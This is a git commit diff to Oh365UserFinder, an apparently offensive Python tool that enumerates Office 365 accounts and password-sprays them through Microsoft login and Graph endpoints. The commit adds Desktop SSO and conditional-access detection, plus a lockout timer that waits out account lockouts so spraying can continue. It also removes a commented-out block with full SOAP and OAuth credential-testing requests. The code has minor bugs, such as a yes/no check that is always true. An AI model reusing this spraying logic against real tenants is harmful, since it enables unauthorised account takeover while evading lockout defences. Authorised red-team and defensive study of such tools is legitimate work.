5373836cf041aa6edb5cc9780692472e90bdb634
Joe Helle <25853389+dievus@users.noreply.github.com>
2022-05-03 09:49:45 -0400

    Added messaging for Desktop SSO

--- oh365userfinder.py
+++ oh365userfinder.py
@@ -41,10 +41,13 @@ python3 Oh365UserFinder.py -r emails.txt -w validemails.txt -t 30\n
 ---Validate a list of emails and write to CSV---
 python3 Oh365UserFinder.py -r emails.txt -c validemails.csv -t 30\n
 ---Password Spray a list of emails using GRAPH--- (Can be used to identify valid account credentials with MFA enabled)
-python3 Oh365UserFinder.py -r -p <password> --pwspray --elist <listname>\n
-
+python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname>\n
+---Password Spray a list of emails using GRAPH with lockout policy timer---
+python3 Oh365UserFinder.py -p <password> --pwspray --elist <listname> --lockout <time>\n
 
 '''))
+    opt_parser.add_argument(
+        '-d', '--domain', help='Validate if a domain exists')
     opt_parser.add_argument(
         '-e', '--email', help='Runs o365UserFinder against a single email')
     opt_parser.add_argument(
@@ -56,11 +59,12 @@ python3 Oh365UserFinder.py -r -p <password> --pwspray --elist <listname>\n
     opt_parser.add_argument(
         '-c', '--csv', help='Writes valid emails to a .csv file')
     opt_parser.add_argument(
-        '-d', '--domain', help='Validate if a domain exists')
-    opt_parser.add_argument(
         '-v', '--verbose', help='Prints output verbosely', action='store_true')
     opt_parser.add_argument(
         '-gs', '--pwspray', help='Password sprays a list of accounts using GRAPH', action='store_true')
+    opt_parser.add_argument(
+        '-l', '--lockout', help='Sets the lockout timer if known (in minutes)')
+
     # opt_parser.add_argument(
     #     '-ps', '--pwspray', help='Password sprays a list of accounts using RST', action='store_true')
     opt_parser.add_argument('-p', '--password', help='Password to be tested')
@@ -94,17 +98,23 @@ def main():
         valid_response5 = re.search('"IfExistsResult":5,', response)
         valid_response6 = re.search('"IfExistsResult":6,', response)
         invalid_response = re.search('"IfExistsResult":1,', response)
+        desktopsso_response = re.search('{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
         throttling = re.search('"ThrottleStatus":1', response)
         if args.verbose:
             print('\n', email, s, body, request, response_dict, response, valid_response,
-                  valid_response5, valid_response6, invalid_response, '\n')
-        if invalid_response:
+                  valid_response5, valid_response6, invalid_response, desktopsso_response,'\n')
+        if desktopsso_response:
+            a = email
+            b = " Result -  Desktop SSO Enabled [!]"
+            print(
+                info + f'[!] {a:51} {b} ' + close)
+        if invalid_response and not desktopsso_response:
             a = email
             b = " Result - Invalid Email Found! [-]"
             print(fail + f"[-] {a:51} {b}" + close)
         if valid_response or valid_response5 or valid_response6:
             a = email
-            b = " Result - Valid Email Found! [+]"
+            b = " Result -   Valid Email Found! [+]"
             print(success + f"[+] {a:53} {b} " + close)
         if throttling:
             print(
@@ -127,13 +137,19 @@ def main():
                 valid_response6 = re.search('"IfExistsResult":6,', response)
                 invalid_response = re.search('"IfExistsResult":1,', response)
                 throttling = re.search('"ThrottleStatus":1', response)
+                desktopsso_response = re.search('{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
                 if args.verbose:
                     print('\n', s, email_line, email, body, request, response, valid_response,
-                          valid_response5, valid_response6, invalid_response, '\n')
-                if invalid_response:
+                          valid_response5, valid_response6, invalid_response, desktopsso_response,'\n')
+                if desktopsso_response:
+                    a = email
+                    b = " Result -  Desktop SSO Enabled [!]"
+                    print(
+                        info + f'[!] {a:51} {b} ' + close)
+                if invalid_response and not desktopsso_response:
                     a = email
                     b = " Result - Invalid Email Found! [-]"
-                    print(fail + f"[-] {a:51} {b}\x1b[0m" + close)
+                    print(fail + f"[-] {a:51} {b}" + close)
                 if valid_response or valid_response5 or valid_response6:
                     a = email
                     b = " Result -   Valid Email Found! [+]"
@@ -212,84 +228,8 @@ def main():
             print(
                 fail + f"[info] The listed domain {domain_name} does not exist.\n" + close)
         print(info + f'[info] Scan completed at {time.ctime()}' + close)
-
-    # elif args.pwspray:
-    #     with open(args.elist) as input_emails:
-    #         for line in input_emails:
-    #             email_line = line.split()
-    #             email = ' '.join(email_line)
-    #             password = args.password
-    #             s = o365request.session()
-    #             body = '<?xml version="1.0" encoding="UTF-8"?><S:Envelope xmlns:S="http://www.w3.org/2003/05/soap-envelope" xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust"><S:Header><wsa:Action S:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action><wsa:To S:mustUnderstand="1">https://login.microsoftonline.com/rst2.srf</wsa:To><ps:AuthInfo xmlns:ps="http://schemas.microsoft.com/LiveID/SoapServices/v1" Id="PPAuthInfo"><ps:BinaryVersion>5</ps:BinaryVersion><ps:HostingApp>Managed IDCRL</ps:HostingApp></ps:AuthInfo><wsse:Security><wsse:UsernameToken wsu:Id="user"><wsse:Username>' + \
-    #                 email + '</wsse:Username><wsse:Password>' + password + '</wsse:Password></wsse:UsernameToken></wsse:Security></S:Header><S:Body><wst:RequestSecurityToken xmlns:wst="http://schemas.xmlsoap.org/ws/2005/02/trust" Id="RST0"><wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType><wsp:AppliesTo><wsa:EndpointReference><wsa:Address>online.lync.com</wsa:Address></wsa:EndpointReference></wsp:AppliesTo><wsp:PolicyReference URI="MBI"></wsp:PolicyReference></wst:RequestSecurityToken></S:Body></S:Envelope>'
-    #             requestURL = 'https://login.microsoftonline.com/rst2.srf'
-    #             request = o365request.post(requestURL, data=body)
-    #             response = request.text
-    #             valid_response = re.search('AADSTS53003', response)
-    #             account_doesnt_exist = re.search('AADSTS50034', response)
-    #             account_disabled = re.search(
-    #                 'The user account is disabled', response)
-    #             password_expired = re.search('AADSTS50055', response)
-    #             account_locked_out = re.search(
-    #                 'The account is locked', response)
-    #             account_invalid_password = re.search(
-    #                 'AADSTS50126', response)
-    #             mfa_true = re.search('50076', response)
-    #             if valid_response:
-    #                 counter = counter + 1
-    #                 s = o365request.session()
-    #                 body = 'grant_type=password&password=' + password + '&client_id=4345a7b9-9a63-4910-a426-35363201d503&username=' + \
-    #                     email + '&resource=https://graph.windows.net&client_info=1&scope=openid'
-    #                 requestURL = "https://login.microsoft.com/common/oauth2/token"
-    #                 request = o365request.post(requestURL, data=body)
-    #                 response = request.text
-    #                 mfa_true = re.search('50076', response)
-    #                 mfa_true1 = re.search('50079', response)    
-    #                 mfa_true = mfa_true or mfa_true1                  
-    #                 if mfa_true:
-    #                     b = "Result - VALID PASSWORD - MFA ENABLED [+]"
-    #                     print(
-    #                         success + f"[+] {email:52} {b}" + close)
-    #                 else:
-    #                     b = success + "Result -" + " " * \
-    #                         14 + "VALID PASSWORD! [+]"
-    #                     print(
-    #                         success + f"[+] {email:52} {b}" + close)
-    #             if account_doesnt_exist:
-    #                 b = "Result - " + " "*12 + "Invalid Account! [-]"
-    #                 print(fail + f"[-] {email:52} {b}" + close)
-    #             if account_disabled:
-    #                 b = "Result - " + " "*11 + "Account disabled. [!]"
-    #                 print(info + f"[!] {email:52} {b}" + close)
-    #             if account_locked_out:
-    #                 b = "Result - " + " "*11 + "LOCKOUT DETECTED! [!]"
-    #                 print(info + f"[!] {email:52} {b}" + close)
-    #             if password_expired:
-    #                 a = email
-    #                 b = " Result - " + " "*7 + "User Password Expired [!]"
-    #                 print(info + f"[!] {email:51} {b}" + close)
-    #             if account_invalid_password:
-    #                 a = email
-    #                 b = " Result - " + " "*8 + "Invalid Credentials! [-]"
-    #                 print(fail + f"[-] {email:51} {b}" + close)
-    #             if args.timeout is not None:
-    #                 time.sleep(int(args.timeout))
-    #         if counter == 0:
-    #             print(
-    #                 fail + '\n[-] There were no valid logins found. [-]' + close)
-    #             print(
-    #                 info + f'\n[info] Scan completed at {time.ctime()}' + close)
-    #         elif counter == 1:
-    #             print(
-    #                 info + '\n[info] Oh365 User Finder discovered one valid credential pair.' + close)
-    #             print(
-    #                 info + f'\n[info] Scan completed at {time.ctime()}' + close)
-    #         else:
-    #             print(
-    #                 info + f'\n[info] Oh365 User Finder discovered {counter} valid credential pairs.\n' + close)
-    #             print(
-    #                 info + f'\n[info] Scan completed at {time.ctime()}' + close)
     elif args.pwspray:
+        lockout_counter = 0
         with open(args.elist) as input_emails:
             for line in input_emails:
                 email_line = line.split()
@@ -311,6 +251,8 @@ def main():
                 account_locked_out = re.search('50053', response)
                 mfa_true = re.search('50076', response)
                 mfa_true1 = re.search('50079', response)
+                desktopsso_response = re.search('{"DesktopSsoEnabled":true,"UserTenantBranding":null,"DomainType":3}', response)
+                conditional_access = re.search('50158', response)
                 if valid_response:
                     counter = counter + 1
                     b = success + "Result - " + " "*1 + "VALID PASSWORD! [+]"
@@ -328,8 +270,34 @@ def main():
                     b = "Result - " + " "*11 + "Account disabled. [!]"
                     print(info + f"[!] {email:44} {b}" + close)
                 if account_locked_out:
-                    b = "Result - " + " "*11 + "LOCKOUT DETECTED! [!]"
-                    print(info + f"[!] {email:45} {b}" + close)
+                    b = "Result - " + " "*13 + "LOCKOUT DETECTED! [!]"
+                    print(info + f"[!] {email:44} {b}" + close)
+                    lockout_counter = lockout_counter + 1
+                    lockout = int(args.lockout) * 60
+                    if lockout_counter == 3:
+                        print(fail + f'\n[warn] Multiple lockouts detected.\n')
+                        con_proc = input("Would you like to continue the scan after the lockout period is over? (y/n) ")
+                        if con_proc == "y" or "Y":
+                            print(
+                                info + f"Waiting {lockout} seconds before continuing.")
+                            lockout = lockout - 30
+                            time.sleep(int(lockout))
+                            print(info + f'\nContinuing scan in 30 seconds.')
+                            time.sleep(int(30))
+                            timeout_counter = 0
+                            lockout_counter = 0
+                        elif con_proc == "n" or "N":
+                            print(info + "Quitting.")
+                            sys.exit()
+                        else:
+                            print(
+                                fail + f"\n[warn] Invalid input. Quitting.\n")
+                            sys.exit()
+                if desktopsso_response:
+                    a = email
+                    b = " Result -  Desktop SSO Enabled [!]"
+                    print(
+                        info + f'[!] {a:51} {b} ' + close)
                 if account_invalid_password:
                     a = email
                     b = " Result - " + " "*10 + "Invalid Credentials! [-]"
@@ -347,9 +315,15 @@ def main():
                     counter = counter + 1
                     a = email
                     b = "Result - MFA ENABLED NOT YET CONFIGURED [+]"
-                    print(success + f"[+] {email:44} {b}" + close)                    
+                    print(success + f"[+] {email:44} {b}" + close)
+                if conditional_access:
+                    counter = counter + 1
+                    a = email
+                    b = "Result - Duo MFA or other conditional access [+]"
+                    print(success + f"[!] {email:44} {b}" + close)
                 if args.timeout is not None:
                     time.sleep(int(args.timeout))
+
             if counter == 0:
                 print(
                     fail + '\n[-] There were no valid logins found. [-]' + close)
@@ -367,6 +341,9 @@ def main():
                     info + f'\n[info] Scan completed at {time.ctime()}' + close)
     else:
         sys.exit()
+
+def new_func():
+    return 60
 
 
 if __name__ == "__main__":
